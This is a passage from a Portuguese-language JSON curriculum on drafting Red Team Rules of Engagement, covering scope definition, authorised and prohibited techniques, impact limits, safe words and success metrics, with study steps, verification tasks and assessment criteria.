                                "Riscos e Compliance: Integração legal em segurança.",
                                "Comunicação: Redação clara de documentos ROE."
                              ],
                              "realWorldApplication": "Em um pentest autorizado para uma organização, o profissional usa ROE para limitar ações a alvos contratados, garantindo conformidade com LGPD ao evitar coleta não autorizada de dados pessoais, prevenindo multas milionárias e ações judiciais."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.1.4.2",
                        "name": "Componentes Essenciais das Regras de Engajamento",
                        "description": "Detalhamento dos elementos chave que compõem as ROE, incluindo alvos, técnicas permitidas e métricas de sucesso, essenciais para o planejamento de cenários de ameaça em Red Team.",
                        "specificSkills": [
                          {
                            "id": "10.1.1.4.2.1",
                            "name": "Especificar Alvos e Escopo Permitidos",
                            "description": "Listar e descrever alvos in-scope (permitidos) e out-of-scope (proibidos), como sistemas de produção versus ambientes de teste, utilizando exemplos do 'Hands-on Ethical Hacking and Network Defense'.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Conceitos Fundamentais de Alvos In-Scope e Out-of-Scope",
                                  "subSteps": [
                                    "Defina 'alvos in-scope' como ativos autorizados para testes de segurança, como ambientes de desenvolvimento ou staging.",
                                    "Defina 'alvos out-of-scope' como sistemas proibidos, incluindo produção ao vivo, dados sensíveis de clientes e infraestruturas de terceiros.",
                                    "Estude exemplos do livro 'Hands-on Ethical Hacking and Network Defense', como testar VMs isoladas vs. servidores de banco de dados reais.",
                                    "Crie um glossário pessoal com termos relacionados: RoE (Rules of Engagement), escopo de teste e impactos potenciais.",
                                    "Analise um template de RoE para identificar seções dedicadas a alvos."
                                  ],
                                  "verification": "Crie um documento de 1 página resumindo definições e exemplos; revise se cobre in-scope vs. out-of-scope claramente.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Livro 'Hands-on Ethical Hacking and Network Defense' (capítulos sobre RoE)",
                                    "Notebook ou editor de texto",
                                    "Templates de RoE online (ex: SANS Institute)"
                                  ],
                                  "tips": "Use tabelas para contrastar in-scope e out-of-scope visualmente.",
                                  "learningObjective": "Diferenciar conceitualmente alvos permitidos e proibidos em contextos de ethical hacking.",
                                  "commonMistakes": [
                                    "Confundir staging com produção",
                                    "Ignorar impactos indiretos como dependências de rede"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar e Listar Exemplos de Alvos Baseados em Cenários Reais",
                                  "subSteps": [
                                    "Revise cenários do livro: ambientes de teste (in-scope) vs. sistemas de produção (out-of-scope).",
                                    "Liste 5 alvos in-scope comuns: VMs de lab, redes isoladas, aplicativos de dev.",
                                    "Liste 5 alvos out-of-scope: servidores live, dados PII, infra de provedores cloud não autorizados.",
                                    "Classifique alvos por categoria: rede, aplicação, hardware, dados.",
                                    "Mapeie riscos associados a cada alvo, como downtime em produção."
                                  ],
                                  "verification": "Gere uma lista categorizada de 10 alvos (5 in, 5 out) com descrições; valide contra exemplos do livro.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Livro 'Hands-on Ethical Hacking and Network Defense'",
                                    "Ferramenta de mind mapping (ex: XMind ou papel)",
                                    "Diagrama de rede de um lab virtual"
                                  ],
                                  "tips": "Use bullet points com justificativas para cada alvo para reforçar raciocínio.",
                                  "learningObjective": "Aplicar conceitos a exemplos concretos de ethical hacking.",
                                  "commonMistakes": [
                                    "Listar alvos vagos sem descrições específicas",
                                    "Subestimar escopo indireto como APIs conectadas"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Especificar Alvos e Escopo em um Documento de Regras de Engajamento",
                                  "subSteps": [
                                    "Esboce uma seção de 'Alvos e Escopo' em um template de RoE.",
                                    "Descreva alvos in-scope com detalhes: IPs, URLs, tipos de testes permitidos (ex: scans Nmap em 192.168.1.0/24).",
                                    "Descreva out-of-scope explicitamente: 'Proibido: qualquer acesso a *.prod.company.com'.",
                                    "Inclua critérios de inclusão/exclusão e condições (ex: só após aprovação).",
                                    "Incorpore exemplos do livro para cenários de network defense."
                                  ],
                                  "verification": "Redija uma seção completa de RoE (300-500 palavras); peça feedback simulando um stakeholder.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Template de RoE (NIST SP 800-115 ou similar)",
                                    "Livro 'Hands-on Ethical Hacking and Network Defense'",
                                    "Ferramenta de edição (Google Docs ou MS Word)"
                                  ],
                                  "tips": "Use linguagem clara, sem ambiguidades; inclua cláusulas de 'safe words' para parar testes.",
                                  "learningObjective": "Criar especificações acionáveis e precisas para alvos em RoE.",
                                  "commonMistakes": [
                                    "Descrições vagas como 'servidores de teste'",
                                    "Esquecer de listar exceções ou dependências"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Revisar e Validar a Especificação de Alvos",
                                  "subSteps": [
                                    "Realize uma revisão peer-like: verifique clareza, completude e ausência de ambiguidades.",
                                    "Simule um walkthrough: 'Posso testar isso? Por quê?' para cada alvo.",
                                    "Compare com melhores práticas do livro e standards como PTES (Penetration Testing Execution Standard).",
                                    "Atualize o documento com feedback: adicione diagramas ou anexos.",
                                    "Teste em um lab: configure alvos mock e valide conformidade."
                                  ],
                                  "verification": "Produza versão final revisada; execute um checklist de validação com 100% de cobertura.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Checklist de revisão RoE (criar um)",
                                    "Ambiente lab (VirtualBox com VMs)",
                                    "Livro para referência cruzada"
                                  ],
                                  "tips": "Envolva um colega ou use fóruns como Reddit r/netsec para validação externa.",
                                  "learningObjective": "Garantir robustez e conformidade da especificação de alvos.",
                                  "commonMistakes": [
                                    "Pular revisão, assumindo perfeição",
                                    "Ignorar validação prática em lab"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um exercício de ethical hacking simulado de uma rede corporativa, especifique in-scope: 'Servidores de staging em 10.0.1.0/24, testes limitados a scans de vulnerabilidade e exploração não-destrutiva'. Out-of-scope: 'Servidores de produção em 10.0.2.0/24, qualquer teste que cause downtime ou acesse dados reais de clientes'. Como no capítulo de labs do 'Hands-on Ethical Hacking and Network Defense', onde testes são confinados a VMs isoladas.",
                              "finalVerifications": [
                                "Documento de RoE lista pelo menos 3 alvos in-scope e 3 out-of-scope com descrições detalhadas.",
                                "Exemplos incluem distinção clara entre prod/test, alinhados ao livro.",
                                "Checklist de revisão confirma ausência de ambiguidades.",
                                "Simulação em lab valida que testes respeitam escopo.",
                                "Stakeholders simulados aprovam a especificação."
                              ],
                              "assessmentCriteria": [
                                "Clareza e precisão nas descrições de alvos (sem jargão desnecessário).",
                                "Completude: cobre rede, apps, dados e exceções.",
                                "Alinhamento com exemplos do 'Hands-on Ethical Hacking and Network Defense'.",
                                "Uso de formatos profissionais (tabelas, diagramas).",
                                "Demonstração de riscos mitigados por escopo definido.",
                                "Capacidade de justificar escolhas em walkthrough."
                              ],
                              "crossCurricularConnections": [
                                "Direito e Compliance: Entender leis como CFAA e requisitos de autorização.",
                                "Gestão de Projetos: Definir escopo para evitar scope creep em pentests.",
                                "Redes e Sistemas: Conhecimento de topologias para identificar alvos.",
                                "Ética e Governança: Princípios de responsabilidade em ciberoperações."
                              ],
                              "realWorldApplication": "Em operações de Red Team para uma empresa financeira, especificar alvos in-scope como ambientes de staging permite simular ataques sem risco a transações reais, garantindo conformidade regulatória (ex: PCI-DSS) e evitando multas por downtime não autorizado, conforme práticas em livros como 'Hands-on Ethical Hacking and Network Defense'."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.4.2.2",
                            "name": "Definir Métodos e Técnicas Autorizadas",
                            "description": "Enumerar técnicas de ethical hacking permitidas, como scanning, exploitation e pivoting, excluindo DoS ou ataques destrutivos, com ênfase em ferramentas como as mencionadas em bibliografia de Red Team.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o Conceito de Regras de Engajamento (ROE) em Ethical Hacking",
                                  "subSteps": [
                                    "Pesquisar definições de ROE em contextos de segurança cibernética e Red Team.",
                                    "Analisar exemplos de ROE de frameworks como MITRE ATT&CK ou certificações CEH/OSCP.",
                                    "Identificar os componentes essenciais de ROE, como escopo, métodos e limitações.",
                                    "Estudar a importância legal e ética das ROE para evitar violações.",
                                    "Mapear ROE a cenários de jogos de guerra cibernética."
                                  ],
                                  "verification": "Resumir em um parágrafo o que são ROE e sua relevância, com 3 exemplos citados.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Documentação MITRE ATT&CK",
                                    "Livro 'Red Team Field Manual'",
                                    "Artigos sobre ROE em ethical hacking"
                                  ],
                                  "tips": "Foquem em ROE como contrato legal para proteger tanto o atacante quanto o defensor.",
                                  "learningObjective": "Entender ROE como base para operações éticas e legais.",
                                  "commonMistakes": [
                                    "Confundir ROE com metas gerais",
                                    "Ignorar aspectos legais",
                                    "Não citar fontes confiáveis"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Enumerar Técnicas de Ethical Hacking Autorizadas",
                                  "subSteps": [
                                    "Listar técnicas permitidas: scanning (portas e serviços), enumeration (usuários e shares), exploitation (vulnerabilidades não destrutivas).",
                                    "Incluir pivoting e post-exploitation não invasiva, como privilege escalation.",
                                    "Referenciar bibliografia Red Team para técnicas como reconnaissance passiva.",
                                    "Classificar técnicas por fase: reconnaissance, weaponization, delivery, etc.",
                                    "Priorizar técnicas reversíveis e não disruptivas."
                                  ],
                                  "verification": "Criar uma tabela com pelo menos 5 técnicas autorizadas e sua descrição breve.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Ferramentas como Nmap e Nessus (documentação)",
                                    "Guia CEH v11",
                                    "Bibliografia Red Team específica"
                                  ],
                                  "tips": "Use frameworks como Cyber Kill Chain para organizar as técnicas.",
                                  "learningObjective": "Identificar e classificar técnicas permitidas em ethical hacking.",
                                  "commonMistakes": [
                                    "Incluir técnicas destrutivas como DoS",
                                    "Não diferenciar reconnaissance de exploitation",
                                    "Listar técnicas sem justificativa"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar Ferramentas Autorizadas e Proibições",
                                  "subSteps": [
                                    "Listar ferramentas da bibliografia Red Team: Nmap (scanning), Metasploit (exploitation), BloodHound (pivoting).",
                                    "Excluir ferramentas para DoS (ex: LOIC, hping3 em modo flood) ou destrutivas.",
                                    "Definir regras de uso: apenas em ambientes autorizados, com logs ativados.",
                                    "Mapear ferramentas a técnicas específicas autorizadas.",
                                    "Documentar limitações de cada ferramenta para evitar misuse."
                                  ],
                                  "verification": "Elaborar uma lista de 8 ferramentas autorizadas com técnicas associadas e 3 proibidas com razões.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Documentação oficial Nmap/Metasploit",
                                    "Red Team Field Manual",
                                    "Lista de ferramentas OSCP"
                                  ],
                                  "tips": "Sempre verifique licenças e compatibilidade com ROE antes de usar.",
                                  "learningObjective": "Associar ferramentas a técnicas éticas e excluir as proibidas.",
                                  "commonMistakes": [
                                    "Recomendar ferramentas black-hat",
                                    "Esquecer logs e monitoramento",
                                    "Não especificar versões seguras"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Documentar e Validar as Métodos e Técnicas Autorizadas",
                                  "subSteps": [
                                    "Compilar tudo em um documento ROE estruturado: introdução, técnicas permitidas, ferramentas, proibições.",
                                    "Incluir cláusulas de aprovação, escopo e assinatura.",
                                    "Revisar com checklist: completude, clareza, conformidade legal.",
                                    "Simular aplicação em um cenário de lab.",
                                    "Ajustar com base em feedback ou melhores práticas."
                                  ],
                                  "verification": "Produzir um documento ROE completo de 1-2 páginas e autoavaliar com checklist.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Template de ROE (Word/Google Docs)",
                                    "Checklist de conformidade NIST",
                                    "Exemplos de ROE reais anonimizados"
                                  ],
                                  "tips": "Use linguagem clara e objetiva, evitando jargões desnecessários.",
                                  "learningObjective": "Criar um documento ROE acionável e validado.",
                                  "commonMistakes": [
                                    "Documento vago ou incompleto",
                                    "Não incluir proibições explícitas",
                                    "Ignorar revisão final"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um laboratório simulado de pentest em uma VM vulnerável (Metasploitable), defina ROE permitindo Nmap para scanning de portas, Metasploit para exploração de Samba e pivoting via SSH, proibindo qualquer forma de DoS ou deleção de arquivos. Documente e execute um teste controlado.",
                              "finalVerifications": [
                                "Lista inclui scanning, enumeration, exploitation e pivoting.",
                                "Ferramentas como Nmap, Metasploit e BloodHound estão citadas.",
                                "DoS, ataques destrutivos e ransomware estão explicitamente excluídos.",
                                "Documento ROE tem seções claras: permitidas, proibidas, ferramentas.",
                                "Referências à bibliografia Red Team estão presentes.",
                                "Cláusulas legais e de escopo estão definidas."
                              ],
                              "assessmentCriteria": [
                                "Precisão e completude na enumeração de técnicas (80% cobertura das permitidas).",
                                "Clareza e estruturação do documento ROE.",
                                "Correta exclusão de técnicas proibidas com justificativas.",
                                "Integração de ferramentas específicas da bibliografia.",
                                "Demonstração de compreensão ética e legal.",
                                "Qualidade da validação e verificações internas."
                              ],
                              "crossCurricularConnections": [
                                "Ética em Tecnologia da Informação (princípios morais em hacking).",
                                "Direito Digital (conformidade com leis como LGPD e Marco Civil).",
                                "Gestão de Projetos (definição de escopo e regras).",
                                "Comunicação Técnica (redação de documentos claros).",
                                "Programação e Redes (conhecimento de ferramentas e protocolos)."
                              ],
                              "realWorldApplication": "Em operações reais de Red Team para empresas, as ROE definidas garantem testes autorizados, minimizando riscos legais e danos, como em assessments de penetração para bancos ou governos, onde apenas técnicas não destrutivas são usadas para simular ataques reais."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.4.2.3",
                            "name": "Estabelecer Limites de Impacto e Saída",
                            "description": "Configurar regras para horários de operação, níveis de ruído aceitáveis e condições de 'safe word' para abortar missões, prevenindo interrupções em serviços críticos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Identificar Serviços Críticos e Potenciais Impactos",
                                  "subSteps": [
                                    "Mapeie todos os sistemas e serviços da rede alvo, priorizando os essenciais (ex: servidores de email, bancos de dados financeiros).",
                                    "Avalie riscos de interrupção, classificando impactos como baixo, médio ou alto com base em tempo de downtime aceitável.",
                                    "Consulte stakeholders para validar classificações de criticidade.",
                                    "Crie uma matriz de impacto com colunas: Serviço, Impacto Potencial, Dependências.",
                                    "Documente thresholds iniciais de impacto (ex: <5% downtime para serviços críticos)."
                                  ],
                                  "verification": "Matriz de impacto completa e aprovada por stakeholders, sem serviços críticos omitidos.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Diagrama de rede",
                                    "Lista de stakeholders",
                                    "Ferramenta de mapeamento como Visio ou Lucidchart",
                                    "Template de matriz de impacto"
                                  ],
                                  "tips": "Comece pelos serviços com maior visibilidade para ganhar buy-in rápido dos stakeholders.",
                                  "learningObjective": "Compreender e catalogar elementos críticos para fundamentar limites de impacto.",
                                  "commonMistakes": [
                                    "Subestimar dependências indiretas",
                                    "Ignorar serviços legacy",
                                    "Não envolver stakeholders cedo"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Definir Limites de Horário de Operação",
                                  "subSteps": [
                                    "Analise padrões de uso da rede (picos de tráfego diários/semanal).",
                                    "Estabeleça janelas de operação baseadas em baixa atividade (ex: 22h-02h fins de semana).",
                                    "Inclua buffers de 30min para setup e teardown.",
                                    "Defina exceções para eventos programados e aprovações necessárias.",
                                    "Integre com calendários de manutenção existentes."
                                  ],
                                  "verification": "Calendário de janelas operacionais documentado e alinhado com dados de tráfego histórico.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Logs de tráfego de rede (Wireshark ou similar)",
                                    "Calendário organizacional",
                                    "Ferramenta de análise temporal como Splunk"
                                  ],
                                  "tips": "Use dados históricos de pelo menos 30 dias para evitar suposições.",
                                  "learningObjective": "Configurar horários que minimizem interrupções em operações reais.",
                                  "commonMistakes": [
                                    "Definir janelas muito amplas",
                                    "Ignorar fusos horários em redes globais",
                                    "Não considerar feriados"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Estabelecer Níveis de Ruído e Condições de Safe Word",
                                  "subSteps": [
                                    "Defina métricas de ruído: ex: <10% aumento de tráfego, <5 eventos de log por minuto.",
                                    "Crie safe words claras e memorizáveis (ex: 'REDLINE' para abortar imediato).",
                                    "Especifique canais de comunicação para safe words (chat seguro, sinal de rádio).",
                                    "Configure alertas automáticos para violações de ruído.",
                                    "Teste safe words em ambiente controlado para validação."
                                  ],
                                  "verification": "Lista de métricas de ruído e protocolos de safe word testados com logs de simulação.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Ferramentas de monitoramento (Nagios, Prometheus)",
                                    "Script de simulação de ruído",
                                    "Lista de canais de comunicação"
                                  ],
                                  "tips": "Escolha safe words não ambíguas e treine a equipe para uso imediato.",
                                  "learningObjective": "Implementar mecanismos de controle e parada de emergência eficazes.",
                                  "commonMistakes": [
                                    "Métricas de ruído muito permissivas",
                                    "Safe words complexas",
                                    "Falta de redundância em canais"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Documentar, Integrar e Validar as Regras",
                                  "subSteps": [
                                    "Compile todos os limites em um documento ROE unificado.",
                                    "Integre com ferramentas de automação (ex: scripts de verificação pré-operação).",
                                    "Realize walkthrough com equipe e simule cenários de violação.",
                                    "Ajuste baseado em feedback e versionar o documento.",
                                    "Agende revisões periódicas (mensal/trimestral)."
                                  ],
                                  "verification": "Documento ROE final aprovado, com simulação bem-sucedida sem violações.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Template ROE padrão",
                                    "Ferramenta de versionamento (Git)",
                                    "Ambiente de simulação cibernética"
                                  ],
                                  "tips": "Use checklists para garantir completude antes da aprovação.",
                                  "learningObjective": "Garantir que limites sejam acionáveis e sustentáveis em operações.",
                                  "commonMistakes": [
                                    "Documentação vaga",
                                    "Falta de testes reais",
                                    "Não versionar mudanças"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um exercício de Red Team simulando um ataque a uma rede bancária, configure ROE para operação apenas das 23h às 01h, ruído máximo de 8% tráfego extra, e safe word 'ABORTAR' via Slack se o servidor de transações for impactado >2min. Durante a simulação, o safe word é acionado ao detectar pico de ruído, parando a missão sem downtime real.",
                              "finalVerifications": [
                                "Matriz de impactos cobre 100% dos serviços críticos.",
                                "Janelas horárias alinhadas com dados de tráfego histórico.",
                                "Safe words testados com tempo de resposta <30s.",
                                "Documento ROE versionado e aprovado por stakeholders.",
                                "Simulação completa sem violações de limites.",
                                "Alertas automáticos configurados e funcionais."
                              ],
                              "assessmentCriteria": [
                                "Precisão e completude na identificação de impactos (90%+ cobertura).",
                                "Clareza e mensurabilidade das regras de ruído/horário.",
                                "Eficácia do mecanismo de safe word em testes.",
                                "Integração com ferramentas existentes sem conflitos.",
                                "Documentação profissional e acionável.",
                                "Adaptabilidade a cenários reais demonstrada."
                              ],
                              "crossCurricularConnections": [
                                "Ética em Cibersegurança: Balanceamento de teste vs. dano real.",
                                "Gerenciamento de Riscos: Análise qualitativa/quantitativa de impactos.",
                                "Direito e Compliance: Conformidade com regulamentações como GDPR em testes.",
                                "Gestão de Projetos: Planejamento temporal e versionamento.",
                                "Engenharia de Software: Automação de verificações e alertas."
                              ],
                              "realWorldApplication": "Em operações de pentest para bancos ou governos, esses limites previnem multas regulatórias e perda de confiança, como em exercícios da NSA onde ROE evitam interrupções em infraestruturas críticas nacionais."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.4.2.4",
                            "name": "Definir Métricas de Sucesso e Falha",
                            "description": "Estabelecer critérios como acesso a IOCs ou C2, e regras para declaração de vitória ou derrota em jogos cibernéticos, alinhados com planejamento de cenários.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender Conceitos Fundamentais de Métricas em Jogos Cibernéticos",
                                  "subSteps": [
                                    "Estude definições de IOCs (Indicators of Compromise) e C2 (Command and Control).",
                                    "Revise exemplos de métricas de sucesso em operações cibernéticas reais.",
                                    "Identifique diferenças entre métricas qualitativas e quantitativas.",
                                    "Analise casos de falha em jogos de guerra cibernética devido a métricas mal definidas.",
                                    "Documente pelo menos 5 métricas padrão usadas em regras de engajamento."
                                  ],
                                  "verification": "Criar um glossário pessoal com definições e exemplos de 5 métricas chave.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Documentação MITRE ATT&CK",
                                    "Guias de Cyber Range",
                                    "Artigos sobre Red Team/Blue Team"
                                  ],
                                  "tips": "Use frameworks como MITRE para exemplos reais e evite jargões desnecessários.",
                                  "learningObjective": "Compreender os blocos de construção de métricas de sucesso e falha em contextos cibernéticos.",
                                  "commonMistakes": [
                                    "Confundir IOCs com IOAs (Indicators of Attack)",
                                    "Ignorar métricas de detecção precoce",
                                    "Focar apenas em sucesso, ignorando falha"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar o Cenário e Objetivos do Jogo Cibernético",
                                  "subSteps": [
                                    "Mapeie os objetivos principais do cenário de jogo (ex: infiltração, persistência).",
                                    "Identifique stakeholders e suas expectativas de vitória/derrota.",
                                    "Liste variáveis chave como tempo, recursos e escopo técnico.",
                                    "Avalie riscos e thresholds para escalada ou parada.",
                                    "Crie um diagrama de fluxo do cenário destacando pontos de medição."
                                  ],
                                  "verification": "Produzir um mapa de cenário com 4-6 pontos de verificação de métricas.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Templates de planejamento de cenários",
                                    "Ferramentas de diagramação como Draw.io",
                                    "Descrição do cenário fornecido"
                                  ],
                                  "tips": "Alinhe análise com ROE (Rules of Engagement) existentes para consistência.",
                                  "learningObjective": "Mapear um cenário cibernético para identificar onde métricas serão aplicadas.",
                                  "commonMistakes": [
                                    "Análise superficial sem considerar impactos em cadeia",
                                    "Ignorar limitações éticas ou legais",
                                    "Sobrecarregar com métricas irrelevantes"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Definir Métricas de Sucesso e Falha Específicas",
                                  "subSteps": [
                                    "Estabeleça métricas de sucesso mensuráveis (ex: acesso confirmado a C2 em <30min).",
                                    "Defina métricas de falha claras (ex: detecção por EDR antes de persistência).",
                                    "Torne métricas SMART (Specific, Measurable, Achievable, Relevant, Time-bound).",
                                    "Priorize 3-5 métricas primárias e 2 secundárias por lado (ataque/defesa).",
                                    "Escreva regras para declaração de vitória/derrota baseadas nessas métricas."
                                  ],
                                  "verification": "Redigir um documento com 6-8 métricas definidas e justificadas.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Modelo SMART",
                                    "Exemplos de ROE de exercícios como Cyber Storm",
                                    "Ferramenta de edição de texto"
                                  ],
                                  "tips": "Use thresholds numéricos sempre que possível para objetividade.",
                                  "learningObjective": "Criar métricas acionáveis e alinhadas que suportem decisões claras em jogos.",
                                  "commonMistakes": [
                                    "Métricas vagas como 'acesso bem-sucedido'",
                                    "Falta de alinhamento com objetivos do cenário",
                                    "Desequilíbrio entre ataque e defesa"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Validar, Integrar e Documentar as Métricas",
                                  "subSteps": [
                                    "Revise métricas com pares ou simulando o cenário.",
                                    "Integre métricas ao documento completo de Regras de Engajamento.",
                                    "Teste em um mini-simulador ou walkthrough.",
                                    "Adicione mecanismos de medição automatizados (ex: logs, scripts).",
                                    "Finalize com cláusulas de revisão pós-jogo."
                                  ],
                                  "verification": "Conduzir uma revisão simulada e ajustar pelo menos 2 métricas baseadas em feedback.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Ferramentas de simulação como Cyber Range software",
                                    "Checklist de validação",
                                    "Versão draft das ROE"
                                  ],
                                  "tips": "Simule 'what-if' para cenários edge cases.",
                                  "learningObjective": "Garantir que métricas sejam robustas, integradas e prontas para uso.",
                                  "commonMistakes": [
                                    "Pular validação prática",
                                    "Documentação incompleta",
                                    "Ignorar pós-análise"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um jogo cibernético simulando ataque a uma rede corporativa: Sucesso = 'Persistência estabelecida em 3 servidores com C2 ativo por 24h sem detecção'; Falha = 'Detecção por SIEM em qualquer IOC dentro de 2h ou perda de controle de C2'. Vitória declarada se >70% dos objetivos atingidos.",
                              "finalVerifications": [
                                "Todas métricas são SMART e mensuráveis.",
                                "Métricas cobrem sucesso, falha e condições de empate.",
                                "Alinhamento verificado com objetivos do cenário.",
                                "Regras de declaração de vitória/derrota são inequívocas.",
                                "Mecanismos de medição (logs, ferramentas) especificados.",
                                "Cláusulas de revisão pós-exercício incluídas."
                              ],
                              "assessmentCriteria": [
                                "Clareza e especificidade das métricas (nota 1-5).",
                                "Mensurabilidade e objetividade (ex: numérica vs. qualitativa).",
                                "Cobertura completa de cenários de sucesso/falha.",
                                "Alinhamento com ROE e planejamento geral.",
                                "Facilidade de verificação prática em simulação.",
                                "Criatividade e relevância para cibersegurança real."
                              ],
                              "crossCurricularConnections": [
                                "Estatística: Definição de KPIs e thresholds probabilísticos.",
                                "Gerenciamento de Projetos: Métricas de desempenho e OKRs.",
                                "Ética e Direito: Considerações legais em ROE cibernéticas.",
                                "Programação: Scripts para automação de verificação de métricas.",
                                "Psicologia: Viés cognitivo em definição de 'vitória'."
                              ],
                              "realWorldApplication": "Em operações de Red Team reais, pentests certificados (OSCP) ou defesas em Cyber Ranges governamentais, onde métricas definem sucesso de missões, otimizam treinamentos e suportam relatórios forenses pós-incidente."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.1.4.3",
                        "name": "Implementação, Monitoramento e Conformidade",
                        "description": "Processos para criar, aprovar e fiscalizar as ROE durante operações, garantindo accountability e lições aprendidas para futuras iterações de Red Team.",
                        "specificSkills": [
                          {
                            "id": "10.1.1.4.3.1",
                            "name": "Elaborar e Aprovar Documento de ROE",
                            "description": "Redigir um template de ROE incluindo assinaturas de stakeholders, com base em práticas do 'Blue Team Handbook' adaptadas para visão ofensiva.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Estudar Fundamentos de ROE e Práticas do Blue Team Handbook",
                                  "subSteps": [
                                    "Ler capítulos relevantes do Blue Team Handbook sobre ROE em defesas cibernéticas",
                                    "Identificar princípios chave como limites de engajamento, responsabilidades e escalonamento",
                                    "Adaptar conceitos defensivos para visão ofensiva (Red Team), focando em simulações de ataque controladas",
                                    "Anotar exemplos de ROE de exercícios reais ou templates públicos",
                                    "Mapear stakeholders típicos (ex: legal, comando, equipe técnica)"
                                  ],
                                  "verification": "Criar um resumo de 1 página com princípios adaptados e lista de stakeholders",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Blue Team Handbook (PDF ou livro físico)",
                                    "Notebook para anotações",
                                    "Acesso a templates de ROE online (ex: MITRE ou SANS)"
                                  ],
                                  "tips": "Priorize regras que evitem danos reais, mesmo em visão ofensiva",
                                  "learningObjective": "Compreender a estrutura e adaptação de ROE para operações ofensivas seguras",
                                  "commonMistakes": [
                                    "Não adaptar para visão ofensiva",
                                    "Ignorar aspectos legais e éticos",
                                    "Sobrecarregar com detalhes desnecessários"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Estruturar o Outline do Template de ROE",
                                  "subSteps": [
                                    "Definir seções principais: introdução, escopo, regras específicas, exceções e assinaturas",
                                    "Criar cabeçalho com data, exercício nomeado e versão do documento",
                                    "Listar regras atômicas (ex: alvos permitidos, técnicas autorizadas, horários de operação)",
                                    "Incluir seções para monitoramento, relatórios e revogação",
                                    "Validar outline contra checklist do Blue Team Handbook"
                                  ],
                                  "verification": "Produzir um outline em formato Word ou Markdown com todas seções delineadas",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Editor de texto (Word/Google Docs)",
                                    "Checklist de ROE do Blue Team Handbook"
                                  ],
                                  "tips": "Use numeração hierárquica para regras (ex: 1.1, 1.2) para clareza",
                                  "learningObjective": "Desenvolver uma estrutura modular e escalável para documentos de ROE",
                                  "commonMistakes": [
                                    "Estrutura muito rígida sem flexibilidade",
                                    "Omitir seção de assinaturas",
                                    "Regras vagas sem exemplos"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Redigir o Conteúdo Detalhado do Template",
                                  "subSteps": [
                                    "Preencher introdução com objetivos do exercício e contexto ofensivo",
                                    "Detalhar regras específicas adaptadas (ex: 'Phishing simulado apenas em ambiente lab')",
                                    "Incluir templates de assinaturas com campos para nome, cargo e data",
                                    "Adicionar anexos como glossário de termos e fluxograma de aprovação",
                                    "Revisar linguagem para ser clara, concisa e livre de ambiguidades"
                                  ],
                                  "verification": "Documento draft completo com pelo menos 5 páginas, incluindo todas regras e assinaturas",
                                  "estimatedTime": "4 horas",
                                  "materials": [
                                    "Template outline do step anterior",
                                    "Referências legais (ex: leis de cibersegurança nacionais)"
                                  ],
                                  "tips": "Use verbos de ação (permitir, proibir) e exemplos concretos em cada regra",
                                  "learningObjective": "Redigir ROE acionáveis e adaptadas para cenários ofensivos",
                                  "commonMistakes": [
                                    "Regras muito amplas que permitam violações",
                                    "Falta de exemplos práticos",
                                    "Não incluir revogação de emergência"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
